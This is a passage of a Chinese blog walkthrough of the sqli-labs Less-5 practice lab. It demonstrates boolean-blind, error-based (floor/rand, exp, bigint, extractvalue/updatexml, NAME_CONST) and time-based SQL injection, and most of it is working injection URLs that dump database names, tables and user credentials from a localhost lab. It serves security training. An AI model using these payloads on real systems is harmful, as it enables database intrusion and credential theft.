+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021081527429.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>2.4</strong>  <strong>ord和mid函数</strong></p>
+<p>通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致；</p>
+<p>语法：</p>
+<blockquote>
+<p>ord(string)       //对获取的字符进行ascii码转换；</p>
+<p>mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM <strong>security.users</strong> ORDER BY id LIMIT 0,1),1,1)   //截取字段中第一行的第一个字符；</p>
+<p>mid(column_name,start[,length])</p>
+</blockquote>
+<p><strong>爆第一字段数据</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM  security.users ORDER BY id LIMIT 0,1),1,1))&gt;66 --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM  security.users LIMIT 0,1),1,1))=68 --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((select username from security.users limit 0,1),1,1))=68 --+
+</code></pre>
+<p>解析：首先通过mid函数获取第一行字段数据的第一个字符，并通过ord对字符进行ascii码转换；并进行比较；</p>
+<p>第一个字段数据：Dump；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021081852834.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>爆第一个字段的第二字符：</strong></p>
+<p>URL：备注：和上面截取函数一样，直接修改数值就行；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM  security.users ORDER BY id LIMIT 0,1),2,1))=117 --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM  security.users LIMIT 0,1),2,1))=117 --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((select username from security.users limit 0,1),2,1))=117 --+
+</code></pre>
+<p><strong>记得通过大于和小于号进行折半测试后（二分法后），再用等号确定字符</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021082202436.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>爆第二个字段数据password</strong></p>
+<p>URL：下面只演示第一个字符，后面和之前一样，不做介绍；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(password AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021082616195.png#pic_center" alt="在这里插入图片描述" />
+
+以上测试方法都是通过布尔型盲注测试的；通过以上方式可以获取我们想要的数据信息；</p>
+<hr>
+<p>这里你可能觉得手注有亿点点麻烦，别慌，捷径来了，这里可用burp和脚本，由于我比较菜，不会写脚本，就介绍使用burp的使用方法</p>
+<p>因为前面的payload已经写得比较详细，这里就举两个例子即可，后面操作都是一样的</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090254172.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里burp拿到数据</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090407179.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>点击鼠标右键，选中Intruder模块</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090441518.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>点上面的Intruder</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021084208284.png#pic_center" alt="在这里插入图片描述" />
+
+然后选择Positions</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090613528.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090717232.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里我们将c作为一个变量选中
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090812763.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>add后
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021090850180.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后设置payload模块
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021085153691.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后设置Option模块</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021085331735.png#pic_center" alt="在这里插入图片描述" />
+
+最后点击右上角Start attack</p>
+<p>完成爆破后，点击length</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021091204822.png#pic_center" alt="在这里插入图片描述" />
+
+然后爆破第二位字母</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021091619262.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021091741315.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里再写一个爆破ascii码的
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094333457.png#pic_center" alt="在这里插入图片描述" />
+
+前面几步基本一样，这里只说不一样的</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094547148.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094655397.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094752723.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094915127.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021094959915.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>三、报错盲注</strong></p>
+<p><strong>3.1</strong>  <strong>count(*)、floor(rand(0)*2)、group by 报错</strong></p>
+<p>利用数据库中实际查询和虚拟表查询不同而产生的报错进行获取数据库中我们想要的数据；报错注入不懂的可以看下《Mysql注入之报错注入学习与分析》这篇文章(后面会发出来的)；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select  user()),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
+</code></pre>
+<p>解析：一是需要count(*)计数，二是floor，取的值要么是0或者是1，导致在进行实际查询的计算结果和虚拟表中计算结果的重复导致报错产生，三是group by进行分组，</p>
+<p>备注：0x3a—&gt;“:”</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021101838266.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.1.1  爆库信息</strong></p>
+<p>从上面方式可以成功获取当前连接的数据库</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select  database()),0x3a,floor(rand(0)*2))a from information_schema.columns  group by a --+
+</code></pre>
+<p>或：</p>
+<p>下面方式可以获取更过数据库信息；包括mysql的默认一些数据库信息；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 4,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021102203923.png#pic_center" alt="在这里插入图片描述" />
+
+爆表：</p>
+<p>第一个表信息：</p>
+<p>URL：既然已经得到数据库，那么我们下一步就是表了；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select table_name from  information_schema.tables where table_schema='security' limit  0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a  --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021102557750.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021103004847.png#pic_center" alt="在这里插入图片描述" />
+
+第二个表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  1,count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 1,1),0x3a,floor(rand(0)*2))a from  information_schema.columns group by a --+
+</code></pre>
+<p>第四个表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select table_name from  information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021103113917.png#pic_center" alt="在这里插入图片描述" />
+<strong>3.1.2</strong>  <strong>爆字段名</strong></p>
+<p>从3.1.1中爆出了数据库：mysql、security等以及表：emails、users等</p>
+<p>表users中第一个字段名：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select column_name from  information_schema.columns where table_name='users'  and TABLE_SCHEMA='security' limit  0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a  --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021103952940.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>第二个字段名：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  1,count(*),concat(0x3a,(select column_name from  information_schema.columns where table_name='users'  and TABLE_SCHEMA='security' limit  1,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a  --+
+</code></pre>
+<p>第三个字段名：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union  select 1,count(*),concat(0x3a,(select column_name from  information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit  2,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a  --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021104101796.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.1.3</strong>  <strong>爆出字段信息</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select username,password from  security.users limit 0,1),0x3a,floor(rand(0)*2))a from  information_schema.columns group by a --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102110460540.png#pic_center" alt="在这里插入图片描述" />
+备注：floor(rand(0)*2)  只能爆出一列，所以我们只能填入一列，username或password</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  1,count(*),concat(0x3a,(select username from security.users limit  0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a  --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021104717263.png#pic_center" alt="在这里插入图片描述" />
+
+后面只是改改数据即可</p>
+<p><strong>3.2   利用double数值类型超出范围进行报错注入(此方法有局限性，目前已知==5.5.29、5.5.42==可用)</strong></p>
+<p>EXP(x)  返回值e（自然对数的底）的x次方；如果不懂的，可以看这篇文章：《Mysql注入之exp报错注入》</p>
+<p>URL：备注：使用EXP函数进行报错时，必须的列长，如：这里是id、username、password三列</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021120138383.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>如果<strong>列数量不对</strong>时会报错；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021120432561.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.2.1</strong>  <strong>爆数据库</strong></p>
+<p>第一个数据库：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from  information_schema.schemata limit 0,1)a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021120621536.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>第二个数据库：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 1,1)a))),2,3--+
+</code></pre>
+<p>第三个数据库：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from  information_schema.schemata limit 2,1)a))),2,3--+
+</code></pre>
+<p>第四个数据库：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from  information_schema.schemata limit 3,1)a))),2,3--+
+</code></pre>
+<p>第五个数据库：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from  information_schema.schemata limit 4,1)a))),2,3--+
+</code></pre>
+<p><strong>3.2.2</strong>  <strong>爆表名</strong></p>
+<p>第一张表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from  information_schema.tables where table_schema='security' limit  0,1)a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021120945610.png#pic_center" alt="在这里插入图片描述" />
+
+第二张表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  (exp(~(select * FROM(SELECT table_name from information_schema.tables  where table_schema='security' limit 1,1)a))),2,3--+
+</code></pre>
+<p>第三张表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from  information_schema.tables where table_schema='security' limit  2,1)a))),2,3--+
+</code></pre>
+<p>第四张表：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from  information_schema.tables where table_schema='security' limit  3,1)a))),2,3--+
+</code></pre>
+<p><strong>3.2.3</strong>  <strong>爆字段名</strong></p>
+<p>第一个字段名</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from  information_schema.columns where table_name='users' limit  0,1)a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021121205151.png#pic_center" alt="在这里插入图片描述" />
+
+第二个字段名</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  (exp(~(select * FROM(SELECT column_name from information_schema.columns  where table_name='users' limit 1,1)a))),2,3--+
+</code></pre>
+<p>第三个字段名</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from  information_schema.columns where table_name='users' limit  2,1)a))),2,3--+
+</code></pre>
+<p><strong>3.2.3</strong>  <strong>爆字段数据；</strong></p>
+<p>第一条数据：username</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT username from security.users  limit 0,1 )a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021121502376.png#pic_center" alt="在这里插入图片描述" />
+
+第一条数据：password</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union  select (exp(~(select * FROM(SELECT password from security.users limit  0,1 )a))),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021121725520.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.3   利用bigint溢出进行报错注入(此方法有局限性，目前已知==5.5.29、5.5.42==可用)</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select database())x) - ~0),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021121936335.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.3.1  爆出数据库</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select schema_name from  information_schema.schemata limit 0,1)x) - ~0),2,3--+
+</code></pre>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select schema_name from  information_schema.schemata limit 4,1)x) - ~0),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021122132214.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.3.2  爆表</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select table_name from  information_schema.tables where table_schema='security' limit 0,1)x) -  ~0),2,3--+
+</code></pre>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  (!(select * from (select table_name from information_schema.tables where table_schema='security' limit 3,1)x) - ~0),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021122311183.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.3.3  爆字段名</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select column_name from  information_schema.columns where table_name='users' limit 0,1)x) -  ~0),2,3--+
+</code></pre>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select  (!(select * from (select column_name from information_schema.columns  where table_name='users' limit 1,1)x) - ~0),2,3--+
+</code></pre>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select column_name from  information_schema.columns where table_name='users' limit 2,1)x) -  ~0),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021122456706.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.3.4  爆字段数据</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select username from security.users  limit 2,1)x) - ~0),2,3--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021122644950.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from  (select password from security.users limit 2,1)x) - ~0),2,3 --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021122849766.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.4   xpath函数报错注入</strong></p>
+<p><strong>Xpath注入之****extractvalue函数</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021123018108.png#pic_center" alt="在这里插入图片描述" />
+<strong>3.4.1 爆出数据库信息</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select database()),0x3a))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102112331720.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>3.4.2</strong>  <strong>爆出表名</strong></p>
+<p>URL：备注：第一张表</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select table_name from  information_schema.tables where table_schema='security' limit  0,1),0x3a))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021123522303.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  extractvalue(1,concat(0x3a,(select table_name from  information_schema.tables where table_schema='security' limit  1,1),0x3a))--+
+</code></pre>
+<p>URL：获取users表；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select table_name from  information_schema.tables where table_schema='security' limit  3,1),0x3a))--+
+</code></pre>
+<p><strong>3.4.3</strong>  <strong>爆表users中的字段名</strong></p>
+<p>URL：第一个字段名</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select column_name from  information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 0,1),0x3a))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021123807993.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>URL：获取‘username’字段名</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  extractvalue(1,concat(0x3a,(select column_name from  information_schema.columns where table_name='users' limit 1,1),0x3a))--+
+</code></pre>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select column_name from  information_schema.columns where table_name='users' limit 2,1),0x3a))--+
+</code></pre>
+<p><strong>3.4.4</strong>  <strong>爆数据内容</strong></p>
+<p>URL：一个字段获取；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select username from security.users limit 0,1),0x3a))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124011523.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  extractvalue(1, concat((SELECT distinct  concat(0x3a,username,0x3a,password,0x3a) FROM users limit 0,1)))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124125823.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>3.4.5</strong>   <strong>Xpath注入之****updatexml函数；和extractvalue语句一致，只是更换了个函数而已；</strong></p>
+<p><strong>爆数据库版本、当前用户信息；</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124249932.png#pic_center" alt="在这里插入图片描述" />
+
+URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+</code></pre>
+<p><strong>爆数据库信息：</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select schema_name from  information_schema.schemata limit 5,1),0x7e),1)--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124514921.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>爆数据库中表信息</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from  information_schema.tables where table_schema='security' limit  0,1),0x7e),1)--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124733120.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  updatexml(1,concat(0x7e,(select table_name from  information_schema.tables where table_schema='security' limit  3,1),0x7e),1)--+
+</code></pre>
+<p><strong>爆表中字段名；</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from  information_schema.columns where table_name='users' limit  0,1),0x7e),1)--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021124915504.png#pic_center" alt="在这里插入图片描述" />
+
+URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  updatexml(1,concat(0x7e,(select column_name from  information_schema.columns where table_name='users' limit  1,1),0x7e),1)--+
+</code></pre>
+<p>爆字段数据；</p>
+<p>URL：</p>
+<p>一列一列</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select username from security.users limit 1,1),0x7e),1)--+
+</code></pre>
+<p>用户名和密码同时爆出</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select distinct  concat(0x3a,username,0x3a,password,0x3a) from security.users limit  1,1),0x7e),1)--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021125118923.png#pic_center" alt="在这里插入图片描述" />
+<strong>3.5   利用数据的重复性；适用于版本较低的mysql数据库；</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021125250840.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>四、时间盲注</strong></p>
+<p>**4.1   利用sleep()函数进行注入，**当错误的时候会有5秒的时间延时；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021125611445.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-06">less-06</h3>
+<p>双注入_GET_双引号_字符型注入</p>
+<p>和Less5差别只在于单双引号</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#预备知识">预备知识</a></li>
+        <li><a href="#辅助配置">辅助配置</a></li>
+        <li><a href="#less-01">less-01</a></li>
+        <li><a href="#less-02">less-02</a></li>
+        <li><a href="#less-03">less-03</a></li>
+        <li><a href="#less-04">less-04</a></li>
+        <li><a href="#less-05盲注">less-05(盲注)</a></li>
+        <li><a href="#less-06">less-06</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
